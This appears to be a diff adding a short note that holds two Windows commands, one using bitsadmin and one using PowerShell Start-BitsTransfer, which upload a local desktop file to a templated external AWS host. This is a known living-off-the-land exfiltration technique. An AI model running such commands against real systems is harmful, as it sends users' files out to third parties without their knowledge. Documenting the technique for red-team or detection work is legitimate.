@@ -1,0 +1,4 @@
+bitsadmin /transfer hello /upload http://<<name>>.compute.amazonaws.com/2.txt C:\Users\test\Desktop\2.txt
+
+Powershell
+Start-BitsTransfer -TransferType Upload -Source 'C:\Users\test\Desktop\2.txt'  -Destination http://<<name>>.compute.amazonaws.com/2.txt -DisplayName TEST
